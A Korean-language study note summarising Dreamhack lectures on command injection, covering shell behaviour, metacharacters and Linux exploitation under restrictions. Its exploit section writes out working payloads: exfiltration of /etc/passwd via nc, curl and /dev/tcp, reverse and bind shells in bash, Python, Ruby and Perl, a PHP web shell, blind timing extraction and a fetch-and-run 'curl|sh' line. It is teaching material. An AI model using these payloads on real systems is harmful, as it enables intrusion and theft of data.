# Web Hacking: Server-side Advanced - Command Injection
🔖 출처
* [Dreamhack Lecture] Server-side Advanced - Command Injection [🔗](https://dreamhack.io/lecture/courses/28)
* [Dreamhack WHA-S] Exploit Tech: Command Injection for Linux [🔗](https://dreamhack.io/lecture/courses/294)
* [Dreamhack WHA-S] Exploit Tech: Command Injection for Windows [🔗](https://dreamhack.io/lecture/courses/301)

<br/><br/>

## Overview: Command Injection
📌 Command Injection Basic [🔗](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Web%20Hacking/Web%20Hacking%3A%20Server-side%20Basic.md#command-injection)
* Command Injection: 이용자의 입력을 시스템 명령어로 실행하게 하는 취약점
    - 명령어를 실행하는 함수에 이용자가 임의의 인자를 전달할 수 있을 때 발생함
    - 공격에 사용되면 웹 애플리케이션에 임의 명령어를 실행할 수 있어 공격 파급력이 높음
    - Command Injection 방지 방법
        + 입력 값에 대한 메타 문자의 유무를 철저히 검사함
        + 시스템 메타 문자를 해석하지 않고 그대로 사용하는 함수를 사용할 것을 권장함

<br/><br/><br/>

## Shell
* 운영체제(OS)에서 커널과 사용자의 입/출력을 담당하는 시스템 프로그램
    - 사용자가 입력하는 데이터를 해석한 후 커널(Kernel)에 요청하고, 요청에 대한 결과르 사용자에게 반환함
        + Windows/Linux에서 사용자가 콘솔을 통해 입력한 명령어를 처리하는 것이 대표적인 예시임
    - 📌 ***OS 명령어는 쉘 위에서 동작하므로 쉘의 영향을 받음 → Command Injection을 위해서는 쉘에 대한 이해가 필수적임***

<br/><br/>

### OS 명령어와 Shell: 어플리케이션에서 OS 명령어를 호출하는 코드를 실행한 상황을 디버깅 툴을 통해 확인함
| 언어 | 코드 |
|:---:|------|
| php | ```$ strace -f php -r "system('id');"``` <br/> ```execve("/usr/bin/php", ["php", "-r", "system('id');"], [/* 28 vars */]) = 0``` <br/> ```...``` <br/> ```lseek(2, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek)``` <br/> ```pipe2([4, 5], O_CLOEXEC) = 0``` <br/> ```clone(child_stack=0, flags=CLONE_CHILD_CLEARTID\|CLONE_CHILD_SETTID\|SIGCHLD, child_tidptr=0x7f9b32033a10) = 10980``` <br/> ```close(5)             = 0``` <br/> ```fcntl(4, F_SETFD, 0) = 0``` <br/> ```read(4, strace: Process 10980 attached``` <br/> ``` <unfinished ...>``` <br/> ```[pid 10980] set_robust_list(0x7f9b32033a20, 24) = 0``` <br/> ```[pid 10980] dup2(5, 1) = 1``` <br/> ```[pid 10980] execve("/bin/sh", ["sh", "-c", "id"], [/* 28 vars */]) = 0``` |
| python | ```$ strace -f python -c "import os;os.system('id')"``` <br/> ```execve("/usr/bin/python", ["python", "-c", "import os;os.system('id')"], [/* 28 vars */]) = 0``` <br/> ```...``` <br/> ```clone(child_stack=0, flags=CLONE_PARENT_SETTID\|SIGCHLD, parent_tidptr=0x7ffc2d43dd3c) = 11542``` <br/> ```wait4(11542, strace: Process 11542 attached``` <br/> ``` <unfinished ...>``` <br/> ```[pid 11542] rt_sigaction(SIGINT, {0x535940, [], SA_RESTORER, 0x7f9cb22ea4b0}, NULL, 8) = 0``` <br/> ```[pid 11542] rt_sigaction(SIGQUIT, {SIG_DFL, [], SA_RESTORER, 0x7f9cb22ea4b0}, NULL, 8) = 0``` <br/> ```[pid 11542] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0``` <br/> ```[pid 11542] execve("/bin/sh", ["sh", "-c", "id"], [/* 28 vars */]) = 0``` | 
* ```strace```: 어플리케이션이 사용하는 시스템 콜, Unix 시그널 발생 등을 확인할 수 있는 디버깅 툴 [🔗](https://man7.org/linux/man-pages/man1/strace.1.html)
    - ```-f``` (```--follow-forks```) 옵션: 자식 프로세스 생성 시 자식 프로세스까지도 추적하도록 함
* OS 명령어 실행 시 자식 프로세스를 생성한 후 ```execve("/bin/sh", ["sh", "-c", "id"], [/* environments */]])```를 호출하여 어플리케이션에서 요청한 명령어를 실행함 <br/> &nbsp;&nbsp; → *어플리케이션을 통해 호출한 OS 명령어 또한 쉘을 통해 실행한다는 것을 알 수 있음*
    ```linux
    sh -c "command" → -c 인자를 읽어들여 명령어를 실행함
    ```

<br/>

### Shell(쉘)의 환경 변수
* ```env``` 또는 ```export``` 등을 통해 쉘의 환경변수를 확인할 수 있음
    ```linux
    $ env
    ...
    SHELL=/bin/bash
    USER=dreamhack
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
    PWD=/tmp
    LANG=en_US.UTF-8
    HOME=/home/dreamhack
    OLDPWD=/
    _=/usr/bin/env
    ...
    ```
    - 환경변수에는 ```PATH``` 변수가 설정되어 있음 <br/> &nbsp;&nbsp; → 사용자가 명령어를 입력하면 해당 ```PATH``` 변수에 설정되어 있는 경로 중 해당 명령어의 위치를 찾아 실행함 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **→ 📌 쉘에서 명령어를 사용할 때 전체 경로를 사용하지 않고 명령어만 이동하더라도 명령어를 실행시킬 수 있음**
    - 이 외에도 현재 쉘에 대한 정보(```SHELL```), 현재 경로(```PWD```), 이전 경로(```OLDPWD```) 등 다양한 정보가 포함되어 있음

<br/>

* ```which```, ```whereis``` 명령어: 인자로 입력된 명령어의 실제 위치를 찾아 반환함
    - 예시 1: 디렉터리의 목록을 출력하는 ```ls``` 명령어
        ```linux
        $ which ls
        /bin/ls

        $ whereis ls
        ls: /bin/ls /usr/share/man/ma1/ls.1.gz
        ```
        + 결과를 통해 ```ls``` 명령어의 실제 위치가 ```/bin/ls```임을 알 수 있음
    - 예시 2: 현재 디렉터리를 변경하는 ```cd``` 명령어
        ```linux
        $ which cd
        $ whereis cd
        cd:
        ```
        + ```which```, ```whereis``` 명령어의 결과로 ```cd``` 명령어의 위치가 출력되지 않음 <br/> &nbsp;&nbsp; → 실제 위치가 존재하지 않는 명령어이지만, 쉘의 내장 명령어(shell builtin)로서 쉘을 통해 명령어를 실행할 경우 사용할 수 있는 명령어
            - 💡 **Shell builtin**
                + ```cd``` 외에도 다양한 명령어들이 해당됨
                + 해당 내장 명령어들은 ```man``` 명령어(```man bash```)를 통해 쉘 메뉴얼에서 확인할 수 있음

<br/><br/>

### Command Injection 취약점 공격 시 유용하게 사용 가능한 메타 문자들의 목록
* Directory (Location)
    | 문자 | 설명 |
    |:---:|------|
    | ```.``` | 현재 디렉터리 |
    | ```..``` | 상위 디렉터리 |
    | ```~``` | 사용자의 홈 디렉터리(home directory) |
    | ```-``` | 이전 작업 디렉터리 (rollback) |
    - 예시
        ```linux
        $ pwd
        /tmp → pwd(print working directory) 명령어로 현재 작업 중인 디렉터리의 이름을 출력함
        $ cd ..; pwd
        / → cd .. 명령어로 현재 디렉터리에서 상위 디렉터리로 이동함
        $ cd ~; pwd 
        /home/userA → cd ~ 명령어로 홈 디렉터리로 이동함
        ```

<br/>

* Sequence expression: ```..```
    - ``시작..끝``형식으로 사용하며, 문자와 정수 범위를 만드는 데 사용함
    - 예시
        ```linux
        $ echo {1..10} 
        1 2 3 4 5 6 7 8 9 10 → 1에서 10까지의 숫자를 echo 명령어를 통해 터미널에 출력함
        ```

<br/>

* Redirection
    - Output redirection: ```>```, ```>>```
        + Write mode(덮어쓰기): ```>```
            - ```명령어 > 파일``` 형식으로 사용하며, 명령어의 표준 출력 스트림의 도착 지점을 파일로 설정함 (덮어쓰기)
            - 예시
                ```linux
                $ id > /tmp/res.txt → 사용자 및 그룹 ID를 출력하는 id 명령어의 결과를 res.txt 파일에 저장함
                $ cat /tmp/res.txt → 파일의 내용을 화면에 출력하는 cat 명령어를 이용해 res.txt 파일을 출력함
                uid=1000(users) gid=1000(users) groups=1000(users)
                ``` 
        + Append mode(추가): ```>>```
            - ```명령어 >> 파일``` 형식으로 사용하며, 명령어의 표준 출력 스트림의 도착지점 파일의 뒷부분에 내용을 추가함
            - 예시
                ```linux
                $ echo 'hello world!' >> /tmp/res.txt → echo 명령어의 출력 스트림을 /tmp/res.txt로 재지정하여 'hello world!' 문자열을 터미널에 출력하는 대신 res.txt 뒷부분에 추가함
                $ id >> /tmp/res.txt → id 명령어의 결과를 res.txt 파일의 뒷부분에 추가함
                $ cat /tmp/res.txt → cat 명령어를 이용해 res.txt 파일을 화면에 출력함
                hello world!
                uid=1000(users) gid=1000(users) groups=1000(users)
                ```
    - Standard output and error redirection (비표준): ```&>```
        + ```명령어 &> 파일``` 형식으로 사용하며, 명령어의 표준 출력과 표준 에러를 모두 파일에 씀 (덮어쓰기)
        + 예시
            ```linux
            $ cat /etc/pass* &> /tmp/res.txt → cat 명령어를 실행한 결과와 실행 시 발생한 에러를 res.txt 파일에 저장함 (덮어씀)
            $ cat /tmp/res.txt → cat 명령어를 이용해 res.txt 파일을 화면에 출력함
            root:x:0:0:root:/root:/bin/bash → 출력 결과
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            ...
            cat: /etc/passwd-: Permission denied → 에러
            ``` 
    - File descriptor redirection: ```>&```
        + 표준 출력(0), 표준 입력(1), 표준 오류(2)와 같은 fd 값을 이용해 출력을 재지정함
            - ```명령어 > 파일 2>&1```은 표준 출력(stout)를 파일에 쓰고, 표준 에러(2)를 백그라운드(&)로 표준 출력(1)에 보내라는 의미
        + 예시
            ```linux
            $ cat /etc/pass* > /tmp/res.txt 2>&1 → cat 명령어를 실행한 결과와 실행 시 발생한 에러를 모두 res.txt 파일에 저장함 (덮어씀)
            $ cat /tmp/res.txt → cat 명령어를 이용해 res.txt 파일을 화면에 출력함
            root:x:0:0:root:/root:/bin/bash → 출력 결과
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            ...
            cat: /etc/passwd-: Permission denied → 에러
            ```
    - Input Redirection (read mode): ```<```
        + ```명령어 < 파일``` 형식으로 사용하며, 파일로부터 입력을 받음 (입력 스트림을 파일로 지정함)
        + 예시
            ```linux
            $ cat < /etc/passwd → cat 명령어를 통해 화면에 출력할 내용을 /etc/passwd 파일로 지정함
            root:x:0:0:root:/root:/bin/bash
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            bin:x:2:2:bin:/bin:/usr/sbin/nologin
            sys:x:3:3:sys:/dev:/usr/sbin/nologin
            ...
            ```

<br/>

* Brace Expansion (Group Command): ```{ }```
    - ```{ }```은 명령어 블록의 시작과 끝을 나타냄
    - 예시
        ```linux
        $ { id; ls; } > /tmp/res.txt → 명령어 블록의 출력 결과를 res.txt 파일에 작성함(덮어씀)
        $ cat /tmp/res.txt → cat 명령어를 이용해 res.txt 파일을 화면에 출력함
        uid=1000(users) gid=1000(users) groups=1000(users)
        bin
        root
        dev
        etc
        home
        ...
        ```

<br/>

* Wildcards
    - question mark: ```?```
        + 매칭되는 하나의 문자를 나타내는 와일드카드 문자로, **1개의 문자**로 대체됨
        + 예시
            ```linux
            $ ls /bin/c??
            /bin/cat → ?은 임의의 문자 하나와 매칭되므로 cat은 c??와 매칭됨
            ```
    - asterisk: ```*```
        + 매칭되는 모든 문자를 나타내는 와일드카드 문자로, **0개 이상의 문자**로 대체됨
        + 예시
            ```linux
            $ ls /bin/c*
            /bin/cat  /bin/chacl  /bin/chgrp  /bin/chmod  /bin/chown  /bin/chvt  /bin/cp  /bin/cpio
            ```

<br/><br/><br/>

## Exploit Technique (Linux)
* Command Injection 취약점을 통해 원하는 정보를 얻는 과정에서 어플리케이션 코드/설정 또는 WAF(Web Application Firewall, 웹 방화벽) 등에 의해 공격이 제한되는 상황이 발생할 수 있음
    - 공격이 제한되는 상황의 종류
        + Command Injection 취약점이 발생하여 원하는 명령어를 실행할 수 있지만 **실행 결과를 직접적으로 확인할 수 없는** 상황
        + Command Injection 취약점이 발생하는 데이터에 **사용자의 입력 값의 길이/내용이 제한**되는 상황
    - ⚠️ *명령어를 실행하는 쉘의 동작 원리와 쉘에서 사용할 수 있는 메타 문자를 활용하여 공격이 제한되는 상황들을 우회하고 정보를 얻을 수 있음*
        + 서버/시스템의 환경 및 설정에 따라 다양한 방법들이 존재함

<br/><br/>

### 실행 결과를 확인할 수 없는 상황
* Command Injection 취약점이 발생해 원하는 OS 명령어를 실행할 수 있지만, 실행 결과가 사용자에게 노출되지 않는 상황에서 활용할 수 있는 공격 방법들 <br/> &nbsp;&nbsp; → Network In/Out Bound 제한 여부와 출력 리다이렉션 가능 여부를 기준으로 다음과 같이 분류할 수 있음

<br/>

* Network In/Out Bound의 제한이 없을 때 사용할 수 있는 방법
    - **Network Outbound**: 삽입할 명령줄에 **네트워크 도구**를 함께 실행해 자신의 서버에 명령어 실행 결과를 전송함
        + 네트워크 도구를 서버에 설치할 수 있거나 설치되었을 때 사용 가능한 방법들이 이에 해당됨
        + OS 명령어를 실행한 결과를 네트워크 도구를 이용해 외부 서버로 전송하는 방법
            - nc (netstat)
                + TCP 또는 UDP 프로토콜을 사용하는 네트워크에서 데이터를 송수신하는 프로그램 <br/> &nbsp;&nbsp; → 쉘에서 제공하는 **파이프와 함께 사용**하여 앞서 실행한 명령어의 결과를 네트워크로 전송할 수 있음
                + 예시
                    - [1] 파이프와 nc를 통해 /etc/passwd 파일의 출력 결과를 특정 IP(```127.0.0.1```), PORT(```8080```)에 전송함
                        ```linux
                        cat /etc/passwd | nc 127.0.0.1 8080
                        ```
                    - [2] nc를 이용해 해당 IP(```127.0.0.1```), PORT(```8080```)로 전송된 데이터의 내용을 확인할 수 있음
                        ```linux
                        $ nc -l -p 8080 -k -v
                        Listening on [0.0.0.0] (family 0, port 8080)
                        Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42396)
                        root:x:0:0:root:/root:/bin/bash
                        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
                        bin:x:2:2:bin:/bin:/usr/sbin/nologin
                        sys:x:3:3:sys:/dev:/usr/sbin/nologin
                        ...
                        ```
            - telent
                + 네트워크 연결에 사용되는 프로토콜 (클라이언트를 설치해 네트워크 연결을 시도할 수 있음) <br/> &nbsp;&nbsp; → 쉘에서 제공하는 **파이프와 함께 사용**하여 앞서 실행한 명령어의 결과를 네트워크로 전송할 수 있음
                + 예시: /etc/passwd 파일의 출력 결과를 telnet을 이용해 ```127.0.0.1```(IP)의 ```8080```(PORT)번 포트로 전송함
                    ```linux
                    cat /etc/passwd | telnet 127.0.0.1 8080
                    ```
            - curl/wget
                + 웹 서버의 컨텐츠를 가져오는 프로그램 <br/> &nbsp;&nbsp; → 웹 서버의 컨텐츠를 가져오기 위해 서버를 방문할 때 접속 로그가 남게 되는 특징을 이용해 **명령어의 실행 결과를 웹 서버의 경로 또는 Body와 같은 영역에 포함**해 전송함
                + 예시
                    - GET Parameter에 ```ls -al``` 실행 결과(디렉터리 목록)를 포함해서 네트워크(127.0.0.1의 8080번 포트)로 전송함
                        ```linux
                        curl "http://127.0.0.1:8080/?$(ls -al|base64 -w0)"
                        ```
                        + ```base65 -w0``` → 실행 결과의 개행을 제거하기 위해 base64로 인코딩하여 전달함
                    - ```ls -al``` 실행 결과(디렉터리 목록)을 POST Body에 포함해서 네트워크(127.0.0.1의 8080번 포트)로 전송함
                        ```linux
                        curl http://127.0.0.1:8080/ -d "$(ls -al)"
                        wget http://127.0.0.1:8080/ --method=POST --body-data="`ls -al`"
                        ```
            - /dev/tcp, /dev/udp
                + (bash 한정) Bash에서 지원하는 기능으로 네트워크에 연결하는 방법
                    - ```/dev/tcp``` 또는 ```/dev/udp``` 장치 경로의 하위 디렉터리로 IP 주소와 포트 번호(```/dev/tcp/{IP주소}/{PORT번호}```)를 입력하면 Bash는 해당 경로로 네트워크 연결을 시도하는 특징을 이용함 <br/> &nbsp;&nbsp; → 앞선 명령어의 실행 결과를 ```>``` 문자로 재지정(redirection)하여 해당 경로로 명령어의 실행 결과를 전송함
                + 예제: ```/dev/tcp```를 이용하여 /etc/passwd 파일의 출력 결과를 네트워크(127.0.0.1의 8080번 포트)로 전송함
                    ```linux
                    cat /etc/passwd > /dev/tcp/127.0.0.1/8080
                    ```
    - **Reverse Shell / Bind Shell**: 임의로 실행할 쉘 명령어를 네트워크를 통해 입력하거나 출력하여 공격하는 기법
        + **Reverse Shell**(리버스 쉘): 취약점이 발생하는 서버(공격 대상 서버)에서 공격자의 서버로 쉘을 연결하는 것 *→ Network Outbound*
            - sh & bash를 이용하는 방법
                + **```/dev/tcp``` 또는 ```/dev/udp``` 장치 경로**를 사용해 포트를 서비스하는 서버에 공격 대상의 서버를 실행시킬 수 있음 <br/> &nbsp;&nbsp; → 경로를 입력한 IP 주소를 가진 서버에서 특정 포트를 열고 기다린 후 명령어를 실행하면 쉘을 획득할 수 있음
                + 예시
                    - 공격 대상 서버 (victim)
                        ```linux
                        /bin/sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
                        /bin/sh -i >& /dev/udp/127.0.0.1/8080 0>&1
                        ```
                    - 공격자 서버 (attacker)
                        ```linux
                        $ nc -l -p 8080 -k -v
                        Listening on [0.0.0.0] (family 0, port 8080)
                        Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42202)
                        $ id
                        uid=1000(user1) gid=1000(user1) groups=1000(user1)
                        ```
                        + 127.0.0.1(IP 주소)를 가진 공격자 서버는 8080번 포트를 열고 공격 전에 미리 대기하고 있어야 함 <br/> &nbsp;&nbsp; → 연결을 맺게 되면 명령어를 실행하면 쉘을 획득할 수 있음
            - 특정 언어를 이용하는 방법
                + **command line에서 코드를 실행할 수 있는 Python, Rudy 등의 언어**를 이용하여 command line에서 소켓을 사용해 리버스 쉘 공격을 수행함
                + 예시: command line에 아래의 Python/Ruby 코드를 입력함
                    - Python
                        ```python
                        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
                        ```
                    - Ruby
                        ```ruby
                        ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","8000");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
                        ```
        + **Bind Shell**(바인드 쉘): 취약점이 발생하는 서버(공격 대상 서버)에서 특정 포트로 쉘을 서비스하는 것 *→ Network Inbound*
            - nc(netcat)를 이용하는 방법
                + 버전에 따라 특정 포트에 임의 서비스를 등록할 수 있도록 제공하는 **```-e``` 옵션을 이용**해 포트를 열고 ```/bin/sh```를 실행시킴 <br/> &nbsp;&nbsp; ↳ *버전에 따라 ```-e``` 옵션을 지원하지 않을 수도 있음*
                + 예시
                    ```linux
                    nc -nlvp 8080 -e /bin/sh
                    ncat -nlvp 8080 -e/bin/sh
                    ```
            - 특정 언어(perl)를 이용하는 방법
                + 펄 스크립트를 작성해서 특정 포트를 쉘(```/bin/sh```)와 함께 바인딩할 수 있음
                + 예시
                    ```perl
                    perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
                    ```
    - **파일 생성**: 어플리케이션 상에서 직접 확인할 수 있는 파일 시스템 경로 또는 어플리케이션 로직을 통해 확인할 수 있는 공간에 명령어의 실행 결과를 저장한 파일을 생성하는 방법
        + **Script Engine**: 웹 루트 하위에 있는 폴더에 php/jsp/asp와 같은 **해석 가능한 파일을 만들어** 웹쉘 형태로 접근하는 방식
            - 웹 서버가 지정한 경로를 알고 있고, 해당 경로에 파일 생성 권한이 있을 때 사용할 수 있음
            - 웹 서버가 지정된 경로에 존재하는 파일을 브라우저에 표시한다는 점을 이용함 <br/> &nbsp;&nbsp; → 웹셸 파일을 업로드한 후 해당 페이지에 접속해 쉘을 실행하여 그 결과를 확인함
            - 예시: 웹 서버에서 지정한 경로가 ```/var/www/html```이고, 해당 디렉터리에 파일 생성 권한이 존재하는 경우
                ```
                printf '<?=system($_GET[0])?>' > /var/www/html/uplaods/shell.php
                ```
                + ```{접속경로}/uploads/shell.php?0={명령어}```를 브라우저를 통해 방문하면 명령어의 실행 결과를 확인할 수 있음
        + **Static File Directory**: Static File Directory에 OS 명령어의 결과를 파일로 생성시킨 후 접근하는 방식
            - 프레임워크 또는 다양한 웹 어플리케이션에서 JS/CSS/Img 등의 정적 리소스를 다루기 위해 사용하는 Static File Directory에 파일 생성 권한이 있어야 사용할 수 있음
                + 파이썬 Flask 프레임워크는 기본적으로 ```static```이 Static File Directory의 이름으로 설정되어 있음
                    - ```static``` 디렉터리를 생성하지 않은 상황에서도 OS 명령어를 통해 ```static``` 디렉터리를 생성한 후 해당 디렉터리 내에 파일을 생성하여 확인할 수 있음 <br/> (프레임워크가 동작하는 디렉터리에 대한 생성 권한이 존재해야만 디렉터리 생성이 가능함)
            - 예시: 파이썬 Flask 프레임워크의 Static File Directory(```static```)
                ```
                /?cmd=mkdir static; id > static/result.txt
                ```
                + OS 명령어(```mkdir```)를 통해 ```static``` 디렉터리를 생성한 후 ```id``` 명령어의 실행 결과를 ```result.txt``` 파일을 생성 후 저장함 <br/> &nbsp;&nbsp; → ```static/result.txt``` 페이지를 방문하면 실행 결과를 확인할 수 있음 

<br/>

* Network In/Out Bound의 제한이 걸려 있고 파일로 출력 값을 리다이렉션시켜 결과를 확인할 수 없을 때 사용할 수 있는 방법 <br/> &nbsp;&nbsp; → ⚠️ 공격 대상 서버에서 네트워크 방화벽 규칙을 적용해 In/Out Bound이 막혀 있고 파일로 출력을 리다이렉션할 수 없으면 **참/거짓 판별**로 데이터룰 추출해야 함
    - **지연 시간**(Sleep): 비교하는 값이 참일 경우 ```sleep``` 명령어를 실행해 지연시간을 발생시켜 웹 애플리케이션에서 반환하는 속도를 이용하여 데이터를 획득함
        + 명령어의 결과를 base64로 인코딩한 값을 한 바이트씩 비교하여 지연 발생 여부(참/거짓)을 통해 데이터를 알아냄
        + 예시
            - [1] ```id``` 명령어의 실행 결과를 ```base64``` 명령어를 이용해 base64로 인코딩함 
                ```linux
                $ id
                uid=33(www-data) gid=33(www-data) groups=33(www-data)

                $ id | base64 -w 0
                dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
                ```
            - [2] 인코딩하여 나온 값을 한 바이트씩 비교하는 Bash 스크립트를 작성함 <br/> &nbsp;&nbsp; → 참이면 ```sleep``` 명령어로 서버 응답을 지연시키고, 거짓이면 스크립트를 종료함
                ```bash
                bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then sleep 2; fi;" # 결과: 2초 지연 발생 (true) → 첫번째 문자 d
                bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then sleep 2; fi;" # 결과: 2초 지연 발생(true) → 두번째 문자 W
                bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then sleep 2; fi;" # 결과: 지연 발생 X (false)
                bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then sleep 2; fi;" # 결과: 2초 지연 발생(true) → 세번째 문자 l
                ```
    - **에러**(DoS): 비교하는 값이 참일 경우 시스템 에러(Internal Server Error, HTTP 500)을 발생시켜 에러 반환 여부를 통해 데이터를 획득하는 방법
        + ```sleep``` 명령을 사용할 수 없거나, 시간 지연을 확실히 판별하기 어려운 경우에 사용함
        + HTTP 500 에러(Internal Server Error)를 인위적으로 발생시키는 방법은 다양하지만, 간단한 방법으로는 ```cat /dev/urandom``` 명령어가 있음
        + 예시
            - [1] ```id``` 명령어의 실행 결과를 ```base64``` 명령어를 이용해 base64로 인코딩함
                ```linux
                $ id
                uid=33(www-data) gid=33(www-data) groups=33(www-data)

                $ id | base64 -w 0
                dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
                ```
            - [2] 인코딩하여 나온 값을 한 바이트씩 비교하는 Bash 스크립트를 작성함 <br/> &nbsp;&nbsp; → 500(서버 측 에러, Internal Server Error)이면 참, 그 외의 200(성공, Success)과 같은 값이라면 거짓으로 판단함
                ```bash
                bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (첫번째 문자 d)
                bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (두번째 문자 W)
                bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then cat /dev/urandom; fi;" # 결과: 200(성공) → false
                bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (세번재 문자 l)
                ```

<br/><br/>

### 입력 값의 길이가 제한된 상황
* Command Injection 취약점이 발생하지만 입력 길이가 제한된 상황에서 **append redirection** 또는 **네트워크**를 이용해 명령어를 실행시킬 수 있음
    - Command Injection 취약점을 막기 위해 애플리케이션에서 특정 기능을 수행할 때 **필요한 데이터만 받고 처리하는 것**을 권장함 <br/> &nbsp;&nbsp; → 입력 값의 길이를 제한하는 방법을 통해서 필요한 데이터만을 받고 처리하도록 만들 수 있음
        + 예시: 서버의 네트워크 상태를 판별하는 기능
            - IP 주소와 도메인 외에는 처리할 필요가 없으므로 길이를 통해 이를 제한하면 공격에 제약 사항이 발생함
                | 종류 | 설명 |
                |:---:|------|
                | 도매인 | 길이를 예측할 수 없으므로 길이를 통해 제한할 수 없음 |
                | IP 주소 | 길이가 정해져 있기 때문에 길이를 통해 제한할 수 있음 <br/> &nbsp;&nbsp; - IPv4(```xxx.xxx.xxx.xxx```) 기준으로 16바이트 이상의 값을 입력 받을 필요가 없음 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; → 15바이트 이하의 데이터만 처리하도록 제한함 |

<br/>

* 리다이렉션(Redirection)을 이용하는 방법
    - 쉘의 기능인 append redirection(리다이렉션)을 이용해 사용자가 쓰기 권한을 갖고 있는 임의 디렉터리에 파일을 생성함 <br/> &nbsp;&nbsp; → 한 글자씩 원하는 문자를 파일에 저장한 후 ```bash```, ```python``` 등의 인터프리터를 이용해 실행함
    - 예시: 입력 값의 길이가 제한된 상황에서 공격자의 서버와 리버스 연결을 맺는 상황
        + 공격 스크립트
            ```bash
            printf bas>/tmp/1 # → Line 1
            printf h>>/tmp/1
            printf \<>>/tmp/1
            printf /d>>/tmp/1
            printf ev>>/tmp/1
            printf /t>>/tmp/1
            printf cp>>/tmp/1
            printf />>/tmp/1
            printf 1 >>/tmp/1
            printf 2 >>/tmp/1
            printf 7.>>/tmp/1
            printf 0.>>/tmp/1
            printf 0.>>/tmp/1
            printf 1/>>/tmp/1
            printf 1 >>/tmp/1 # → Line 15
            printf 2 >>/tmp/1
            printf 3 >>/tmp/1
            printf 4 >>/tmp/1 # → Line 18
            bash</tmp/1& # → Line 19
            ```
            | Line | 설명 |
            |:---:|------|
            | 1 ~ 18 | 공격자가 원하는 입력을 1~3바이트씩 입력함 <br/> &nbsp;&nbsp; → /tmp/1 파일에 ```bash</dev/tcp/127.0.0.1/1234```의 데이터가 입력됨 <br/> &nbsp;&nbsp;&nbsp;&nbsp; (```/tmp``` 디렉터리는 누구나 읽고 쓸 수 있는 권한이 존재함) |
            | 15 ~ 18 | file descriptor로 인식되지 않기 위ㅐ서 ```print 1 >>/tmp/1```과 같이 숫자 뒤에 스페이스를 추가하고 있음 |
            | 19 | ```/tmp/1```의 내용을 stdin으로 bash를 실행하여 리버스 쉘을 맺을 수 있음 |
        + 공격자 서버
            ```linux
            $ nc -l -p 1234 -k -v
            Listening on [0.0.0.0] (family 0, port 1234)
            Connection from 127.0.0.1 52536 received!
            bash>&0 2>&0
            id
            uid=1000(users) gid=1000(users) groups=1000(users)
            ```
            | Line | 설명 |
            |:---:|------|
            | 1 ~ 2 | 1234번 포트(```-p 1234```)로 tcp 연결을 기다리는(```-l```) ```nc``` 명령어 |
            | 3 | TCP 연결이 맺어짐을 알려줌 |
            | 4 | stdout, stderr를 0번 fd(socket)으로 redirection 시키는 bash를 생성함 <br/> &nbsp;&nbsp; → 이를 통해 원격의 데이터를 현재 소켓으로 출력시킬 수 있음

<br/>

* IP 주소 변환을 이용하는 방법
    + IP 주소 변환
        - 짧은 길이의 도메인을 이용하거나, IP 형시을 long 타입 형식으로 변환(ip2long)하는 등의 방법을 이용해 IP Address를 짧게 입력할 수 있음
        - 📌 ***변환된 IP 주소는 다양한 애플리케이션에서도 해석이 가능하기 때문에 기능이 정상적으로 수행됨***
    + 예시: long 타입으로 변환한 IP 주소를 이용하거 네트워크 도구를 이용한 리버스 쉘(Reverse Shell) 공격
        - [1] IP 주소를 long 타입으로 변환함
            ```python
            #!/usr/bin/python3
            import ipaddress
            int(ipaddress.IPv4Address("127.0.0.1")) # long 타입으로 변환한 결과: 2130706433
            ```
        - [2] Command Injection 취약점이 발생하는 쉘이 최종적으로 실행할 명령어가 포함된 페이지(index.html)를 작성함
            ```linux
            python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("127.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
            ```
        - [3] ```curl```, ```wget``` 등의 네트워크 도구를 통해 외부 서버에 존재하는 index.html를 다운받아 실행할 수 있도록 메타 문자를 설정함
            ```
            curl 2130706433|sh
            $(curl 2130706433)
            `curl 2130706433`
            ```
